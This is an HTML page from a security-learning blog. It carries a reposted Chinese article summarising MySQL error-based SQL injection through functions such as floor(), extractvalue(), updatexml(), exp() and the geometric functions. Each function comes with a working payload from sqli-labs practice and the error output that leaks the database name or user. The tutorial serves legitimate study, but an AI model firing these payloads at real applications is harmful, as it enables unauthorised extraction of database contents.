@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql报错函数小结">
+<meta property="og:url" content="http://yoursite.com/2020/03/10/Mysql报错函数小结/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200304-9b083ddc-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200350-b6986752-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200406-c02c5efe-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200501-e0d07e42-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200531-f2d1d7f8-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200642-1d271798-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200754-47d94fa6-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200811-51fad89c-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200831-5e44234c-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200847-67797444-5bb5-1.jpg">
+<meta property="og:updated_time" content="2021-02-08T07:29:52.768Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql报错函数小结">
+<meta name="twitter:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Mysql报错函数小结 | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Mysql报错函数小结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/03/10/Mysql报错函数小结/" class="article-date">
+      <time datetime="2020-03-09T16:00:00.000Z" itemprop="datePublished">2020-03-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Mysql报错函数小结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><strong>注：本文转载自先知社区</strong></p>
+<p>原文链接：<a href="https://xz.aliyun.com/t/new?draftId=13637" target="_blank" rel="noopener">https://xz.aliyun.com/t/new?draftId=13637</a></p>
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。</p>
+<a id="more"></a>
+
+<h2 id="Mysql报错函数："><a href="#Mysql报错函数：" class="headerlink" title="Mysql报错函数："></a>Mysql报错函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、floor()</span><br><span class="line">2、extractvalue()</span><br><span class="line">3、updatexml()</span><br><span class="line">4、exp()</span><br><span class="line">5、geometrycollection()</span><br><span class="line">6、multiponint()</span><br><span class="line">7、polygon()</span><br><span class="line">8、multipolygon()</span><br><span class="line">9、linestring()</span><br><span class="line">10、multilinestring()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01、floor"><a href="#0x01、floor" class="headerlink" title="0x01、floor()"></a>0x01、floor()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor(x) 函数，向下取整,返回一个不大于x的值</span><br><span class="line">round(x,d) 函数，根据四舍五入保留指定的小数位数，x指要处理的数，d是指保留几位小数。</span><br><span class="line">rand() 函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定的值</span><br></pre></td></tr></table></figure>
+
+<p>报错原理：主键重复<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg" alt><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200304-9b083ddc-5bb4-1.jpg" alt><br>示例1：sql-labs第5关<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand()*2))a from information_schema.tables group by a) b#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200350-b6986752-5bb4-1.jpg" alt></p>
+<h2 id="0x02、extractvalue"><a href="#0x02、extractvalue" class="headerlink" title="0x02、extractvalue()"></a>0x02、extractvalue()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Extractvalue(xml_frag, xpath_expr) 函数使用XPath表示法从XML字符串中提取值</span><br><span class="line">xml_frag: 目标xml文档</span><br><span class="line">xpath_expr: 利用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure>
+
+<p>报错原理：Xpath格式语法书写错误的话，就会报错<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200406-c02c5efe-5bb4-1.jpg" alt><br>示例2：<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select Extractvalue(&apos;1&apos;,concat(&apos;~&apos;,(select database())))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200501-e0d07e42-5bb4-1.jpg" alt></p>
+<h2 id="0x03、updatexml"><a href="#0x03、updatexml" class="headerlink" title="0x03、updatexml()"></a>0x03、updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值</span><br><span class="line">XML_document：String格式，为XML文档对象的名称</span><br><span class="line">XPath_string ：Xpath格式的字符串</span><br><span class="line">new_value：String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+
+<p>报错原理：同extractvalue函数，Xpath格式书写错误就会报错。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200531-f2d1d7f8-5bb4-1.jpg" alt><br>示例3：<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select updatexml(&apos;1&apos;,concat(&apos;~&apos;,(select database())),&apos;1&apos;)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200642-1d271798-5bb5-1.jpg" alt></p>
+<h2 id="0x04、exp"><a href="#0x04、exp" class="headerlink" title="0x04、exp()"></a>0x04、exp()</h2><p>exp()是以e为底的指数函数，但是如果传递的数太大了，当大于709时，exp()就会因为溢出而报错。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200754-47d94fa6-5bb5-1.jpg" alt><br>将0按位取反就会得到“18446744073709551615”，再加上函数成功执行后返回0，我们将成功执行的函数取反就会得到最大的无符号的bigint值。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200811-51fad89c-5bb5-1.jpg" alt><br>通过子查询与按位求反，造成一个DOUBLE overflow error，由此就可以注出数据。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200831-5e44234c-5bb5-1.jpg" alt><br>但由于我这里mysql版本是5.5.53的缘故，无法成功的注出数据。</p>
+<p>成功的示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</span><br><span class="line"> DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05、geometrycollection-、multiponint-、polygon-、multipolygon-、linestring-、multilinestring"><a href="#0x05、geometrycollection-、multiponint-、polygon-、multipolygon-、linestring-、multilinestring" class="headerlink" title="0x05、geometrycollection()、multiponint()、polygon()、multipolygon()、linestring()、multilinestring()"></a>0x05、geometrycollection()、multiponint()、polygon()、multipolygon()、linestring()、multilinestring()</h2><p>以上均为几何函数，函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。</p>
+<p>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>这几个函数用法均相同。<br>但是还是因为mysql版本的问题，没能成功执行。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200847-67797444-5bb5-1.jpg" alt><br>成功示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次整理真的发现了很多问题，也学到了很多。之前还没注意，原来有些报错函数是有版本要求的，看来学习的过程中还是得多多动手才行。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2020-03-10, 00:00:00</p>
+        <p><span>最后更新:</span>2021-02-08, 15:29:52</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/03/10/Mysql报错函数小结/" title="Mysql报错函数小结">http://yoursite.com/2020/03/10/Mysql报错函数小结/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/03/10/Mysql报错函数小结/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/03/23/csrf漏洞小结/">
+                    CSRF漏洞小结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/02/10/文件包含漏洞小结/">
+                    浅谈文件包含漏洞
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql报错函数："><span class="toc-number">2.</span> <span class="toc-text">Mysql报错函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01、floor"><span class="toc-number">3.</span> <span class="toc-text">0x01、floor()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02、extractvalue"><span class="toc-number">4.</span> <span class="toc-text">0x02、extractvalue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03、updatexml"><span class="toc-number">5.</span> <span class="toc-text">0x03、updatexml()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04、exp"><span class="toc-number">6.</span> <span class="toc-text">0x04、exp()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05、geometrycollection-、multiponint-、polygon-、multipolygon-、linestring-、multilinestring"><span class="toc-number">7.</span> <span class="toc-text">0x05、geometrycollection()、multiponint()、polygon()、multipolygon()、linestring()、multilinestring()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Mysql报错函数小结　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/03/23/csrf漏洞小结/" title="上一篇: CSRF漏洞小结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/02/10/文件包含漏洞小结/" title="下一篇: 浅谈文件包含漏洞">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">从文件上传到浅谈.htaccess文件的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/upload-labs通关总结/">upload-labs通关小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/15/BUUCTF部分web题解/">BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">浅谈文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/Owasp juice shop(一)/">Owasp juice shop(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/PHP代码审计之危险函数/">PHP代码审计之危险函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/22/PHP超级全局变量/">PHP超级全局变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/21/一些常见的编码/">一些常见的编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/17/命令执行&代码执行漏洞/">命令执行&代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/Web常见的源码泄露/">Web常见的源码泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/09/RSA算法小结/">RSA算法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/PHP反序列化/">PHP反序列化学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/i春秋-misc系列/">i春秋-misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/文件上传漏洞总结/">文件上传漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/隐写术/">隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/SQL注入一些过滤及绕过总结/">SQL注入一些过滤及绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/SQL简单注入/">SQL简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/图片隐写/">图片隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/攻防世界——Misc系列/">攻防世界——Misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/Web——爆破wp/">WEB——爆破wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/10/WEB——php大法wp/">WEB——php大法wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/图片隐写——小苹果wp/">图片隐写——小苹果wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/10/xss挑战之旅学习笔记/">xss挑战之旅学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/xss学习总结/">xxs学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/SQL注入姿势（2）/">SQL注入姿势（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/SQL注入姿势（1）/">SQL注入姿势（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/PHP学习笔记（5）/">PHP学习笔记（5）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/PHP学习笔记（4）/">PHP学习笔记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/php登录界面小结/">PHP登录界面小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/PHP学习笔记（3）/">PHP学习笔记（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/PHP学习笔记（2）/">PHP学习笔记（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/PHP学习笔记（1）/">PHP学习笔记（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/哈弗曼树/">哈弗曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/css学习笔记/">CSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/HTML学习笔记/">HTML学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/MySQL的一些常用命令行总结/">MySQL的一些常用命令行总结</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
